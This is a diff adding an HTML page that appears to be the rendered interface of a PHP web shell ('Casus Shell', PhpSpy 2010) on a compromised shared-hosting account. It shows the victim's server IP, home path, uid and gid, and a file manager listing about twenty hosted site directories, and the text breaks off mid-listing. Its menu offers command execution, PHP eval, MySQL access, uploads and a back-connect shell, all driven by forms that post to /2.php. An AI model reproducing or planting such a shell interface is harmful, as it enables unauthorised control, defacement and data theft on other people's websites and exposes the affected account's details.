@@ -1,0 +1,894 @@
+﻿?>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gbk">
+<title>SadrazaM | Casus Shell</title>
+<style type="text/css">
+body,td{font: 12px Arial,Tahoma;line-height: 16px;}
+.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
+.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
+.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
+a {color: #00f;text-decoration:underline;}
+a:hover{color: #f00;text-decoration:none;}
+.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}
+.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}
+.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
+.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}
+.head td span{font-weight:normal;}
+form{margin:0;padding:0;}
+h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
+ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
+u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
+</style>
+<script type="text/javascript">
+function CheckAll(form) {
+	for(var i=0;i<form.elements.length;i++) {
+		var e = form.elements[i];
+		if (e.name != 'chkall')
+		e.checked = form.chkall.checked;
+    }
+}
+function $(id) {
+	return document.getElementById(id);
+}
+function goaction(act){
+	$('goaction').action.value=act;
+	$('goaction').submit();
+}
+</script>
+</head>
+<body style="margin:0;table-layout:fixed; word-break:break-all">
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+	<tr class="head">
+		<td><span style="float:right;"><a href="http://www.s4dr4z4m.wordpress.com" target="_blank">PhpSpy Ver: 2010 </a></span>cheaphosting4you.com (192.185.17.110)</td>
+	</tr>
+	<tr class="alt1">
+		<td><span style="float:right;">Safe Mode:No</span>
+			<a href="javascript:goaction('logout');">Cıkıs</a> |
+			<a href="javascript:goaction('file');">File Manager</a> |
+			<a href="javascript:goaction('sqladmin');">MySQL Manager</a> |
+			<a href="javascript:goaction('sqlfile');">MySQL Upload &amp; Download</a> |
+			<a href="javascript:goaction('shell');">Komut Calıstır</a> |
+			<a href="javascript:goaction('phpenv');">PHP Variable</a> |
+			<a href="javascript:goaction('eval');">Eval PHP Code</a>
+			 | <a href="javascript:goaction('backconnect');">Back Connect</a>		</td>
+	</tr>
+</table>
+<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
+<form name="goaction" id="goaction" action="" method="post" >
+<input id="action" type="hidden" name="action" value="" />
+</form>
+<form name="createdir" id="createdir" action="" method="post" >
+<input id="newdirname" type="hidden" name="newdirname" value="" />
+<input id="dir" type="hidden" name="dir" value="/home3/laginha/public_html/" />
+</form>
+<form name="fileperm" id="fileperm" action="" method="post" >
+<input id="newperm" type="hidden" name="newperm" value="" />
+<input id="pfile" type="hidden" name="pfile" value="" />
+<input id="dir" type="hidden" name="dir" value="/home3/laginha/public_html/" />
+</form>
+<form name="copyfile" id="copyfile" action="" method="post" >
+<input id="sname" type="hidden" name="sname" value="" />
+<input id="tofile" type="hidden" name="tofile" value="" />
+<input id="dir" type="hidden" name="dir" value="/home3/laginha/public_html/" />
+</form>
+<form name="rename" id="rename" action="" method="post" >
+<input id="oldname" type="hidden" name="oldname" value="" />
+<input id="newfilename" type="hidden" name="newfilename" value="" />
+<input id="dir" type="hidden" name="dir" value="/home3/laginha/public_html/" />
+</form>
+<form name="fileopform" id="fileopform" action="" method="post" >
+<input id="action" type="hidden" name="action" value="" />
+<input id="opfile" type="hidden" name="opfile" value="" />
+<input id="dir" type="hidden" name="dir" value="" />
+</form>
+<h2>File Manager - Current disk free 393.94 G of 1833.15 G (21.49%)</h2>
+<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
+  <form action="" method="post" id="godir" name="godir">
+  <tr>
+    <td nowrap>Bulundugun Dizin (Writable, 0750)</td>
+	<td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="/home3/laginha/public_html/" type="text" style="width:100%;margin:0 8px;"></td>
+    <td nowrap><input class="bt" value="GO" type="submit"></td>
+  </tr>
+  </form>
+</table>
+<script type="text/javascript">
+function createdir(){
+	var newdirname;
+	newdirname = prompt('Please input the directory name:', '');
+	if (!newdirname) return;
+	$('createdir').newdirname.value=newdirname;
+	$('createdir').submit();
+}
+function fileperm(pfile){
+	var newperm;
+	newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');
+	if (!newperm) return;
+	$('fileperm').newperm.value=newperm;
+	$('fileperm').pfile.value=pfile;
+	$('fileperm').submit();
+}
+function copyfile(sname){
+	var tofile;
+	tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');
+	if (!tofile) return;
+	$('copyfile').tofile.value=tofile;
+	$('copyfile').sname.value=sname;
+	$('copyfile').submit();
+}
+function rename(oldname){
+	var newfilename;
+	newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');
+	if (!newfilename) return;
+	$('rename').newfilename.value=newfilename;
+	$('rename').oldname.value=oldname;
+	$('rename').submit();
+}
+function dofile(doing,thefile,m){
+	if (m && !confirm(m)) {
+		return;
+	}
+	$('filelist').doing.value=doing;
+	if (thefile){
+		$('filelist').thefile.value=thefile;
+	}
+	$('filelist').submit();
+}
+function createfile(nowpath){
+	var filename;
+	filename = prompt('Please input the file name:', '');
+	if (!filename) return;
+	opfile('editfile',nowpath + filename,nowpath);
+}
+function opfile(action,opfile,dir){
+	$('fileopform').action.value=action;
+	$('fileopform').opfile.value=opfile;
+	$('fileopform').dir.value=dir;
+	$('fileopform').submit();
+}
+function godir(dir,view_writable){
+	if (view_writable) {
+		$('godir').view_writable.value=1;
+	}
+	$('godir').dir.value=dir;
+	$('godir').submit();
+}
+</script>
+  <table width="100%" border="0" cellpadding="4" cellspacing="0">
+<form action="/2.php" method="POST" enctype="multipart/form-data"><tr class="alt1"><td colspan="7" style="padding:5px;">
+<div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="./" type="hidden" /><input name="dir" value="./" type="hidden" /></div>
+<a href="javascript:godir('/home3/laginha/public_html');">WebRoot</a>
+ | <a href="javascript:godir('/home3/laginha/public_html/','1');">View Writable</a>
+ | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile('/home3/laginha/public_html/');">Create File</a>
+</td></tr></form>
+<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>
+<tr class=alt1>
+<td align="center"><font face="Wingdings 3" size=4>=</font></td><td nowrap colspan="5"><a href="javascript:godir('/home3/laginha/');">Parent Directory</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/.smileys');">.smileys</a></td>
+<td nowrap>2013-07-07 15:33:35</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/.smileys');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/.smileys');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/.smileys','Are you sure will delete .smileys? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/.smileys');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/adcpd.com');">adcpd.com</a></td>
+<td nowrap>2013-05-27 02:12:06</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/adcpd.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/adcpd.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/adcpd.com','Are you sure will delete adcpd.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/adcpd.com');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/animaramalta.com');">animaramalta.com</a></td>
+<td nowrap>2013-10-01 17:16:02</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/animaramalta.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/animaramalta.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/animaramalta.com','Are you sure will delete animaramalta.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/animaramalta.com');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/asreceitasdabimby.com');">asreceitasdabimby.com</a></td>
+<td nowrap>2013-07-21 05:24:01</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/asreceitasdabimby.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/asreceitasdabimby.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/asreceitasdabimby.com','Are you sure will delete asreceitasdabimby.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/asreceitasdabimby.com');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/cgi-bin');">cgi-bin</a></td>
+<td nowrap>2013-12-12 13:27:55</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/cgi-bin');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/cgi-bin');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/cgi-bin','Are you sure will delete cgi-bin? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/cgi-bin');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/cgiweb');">cgiweb</a></td>
+<td nowrap>2014-01-16 10:07:30</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/cgiweb');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/cgiweb');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/cgiweb','Are you sure will delete cgiweb? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/cgiweb');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/clubegin.pt');">clubegin.pt</a></td>
+<td nowrap>2013-10-21 14:33:08</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/clubegin.pt');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/clubegin.pt');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/clubegin.pt','Are you sure will delete clubegin.pt? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/clubegin.pt');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/configweb');">configweb</a></td>
+<td nowrap>2014-01-16 10:08:32</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/configweb');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/configweb');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/configweb','Are you sure will delete configweb? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/configweb');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/conviviopt.com');">conviviopt.com</a></td>
+<td nowrap>2014-01-10 20:12:54</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/conviviopt.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/conviviopt.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/conviviopt.com','Are you sure will delete conviviopt.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/conviviopt.com');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/dcpd.co.uk');">dcpd.co.uk</a></td>
+<td nowrap>2013-05-27 02:12:06</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/dcpd.co.uk');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/dcpd.co.uk');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/dcpd.co.uk','Are you sure will delete dcpd.co.uk? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/dcpd.co.uk');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/divasdamoda.com');">divasdamoda.com</a></td>
+<td nowrap>2013-05-26 18:03:20</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/divasdamoda.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/divasdamoda.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/divasdamoda.com','Are you sure will delete divasdamoda.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/divasdamoda.com');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/doencasprofissionais.com');">doencasprofissionais.com</a></td>
+<td nowrap>2012-11-20 16:23:46</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/doencasprofissionais.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/doencasprofissionais.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/doencasprofissionais.com','Are you sure will delete doencasprofissionais.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/doencasprofissionais.com');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/emzele.net');">emzele.net</a></td>
+<td nowrap>2012-12-04 19:13:31</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/emzele.net');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/emzele.net');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/emzele.net','Are you sure will delete emzele.net? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/emzele.net');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/entretachosejoaninhas.com');">entretachosejoaninhas.com</a></td>
+<td nowrap>2013-11-20 16:09:02</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/entretachosejoaninhas.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/entretachosejoaninhas.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/entretachosejoaninhas.com','Are you sure will delete entretachosejoaninhas.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/entretachosejoaninhas.com');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/feriasnoalgarve.com');">feriasnoalgarve.com</a></td>
+<td nowrap>2013-08-04 16:01:40</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/feriasnoalgarve.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/feriasnoalgarve.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/feriasnoalgarve.com','Are you sure will delete feriasnoalgarve.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/feriasnoalgarve.com');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/festanimada.com');">festanimada.com</a></td>
+<td nowrap>2013-05-11 08:54:35</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/festanimada.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/festanimada.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/festanimada.com','Are you sure will delete festanimada.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/festanimada.com');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/filmespararir.com');">filmespararir.com</a></td>
+<td nowrap>2013-05-27 02:12:06</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/filmespararir.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/filmespararir.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/filmespararir.com','Are you sure will delete filmespararir.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/filmespararir.com');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/folhetosedescontos.com');">folhetosedescontos.com</a></td>
+<td nowrap>2013-06-02 05:35:31</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/folhetosedescontos.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/folhetosedescontos.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/folhetosedescontos.com','Are you sure will delete folhetosedescontos.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/folhetosedescontos.com');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/informatica');">informatica</a></td>
+<td nowrap>2013-01-03 02:10:15</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/informatica');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/informatica');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/informatica','Are you sure will delete informatica? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/informatica');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/ligialaginha.com');">ligialaginha.com</a></td>
+<td nowrap>2013-06-10 04:48:45</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/ligialaginha.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/ligialaginha.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/ligialaginha.com','Are you sure will delete ligialaginha.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/ligialaginha.com');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/passatemposedescontos.com');">passatemposedescontos.com</a></td>
+<td nowrap>2013-11-24 16:16:26</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/passatemposedescontos.com');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/passatemposedescontos.com');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/passatemposedescontos.com','Are you sure will delete passatemposedescontos.com? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/passatemposedescontos.com');">Rename</a></td>
+</tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/portugalpt.net');">portugalpt.net</a></td>
+<td nowrap>2014-01-15 06:57:59</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/portugalpt.net');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/portugalpt.net');">drwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap><a href="javascript:dofile('deldir','/home3/laginha/public_html/portugalpt.net','Are you sure will delete portugalpt.net? \n\nIf non-empty directory, will be delete all the files.')">Del</a> | <a href="javascript:rename('/home3/laginha/public_html/portugalpt.net');">Rename</a></td>
+</tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>
+<td><a href="javascript:godir('/home3/laginha/public_html/ptescort.com');">ptescort.com</a></td>
+<td nowrap>2013-05-28 10:02:50</td>
+<td nowrap>--</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/ptescort.com');">0755</a> / 
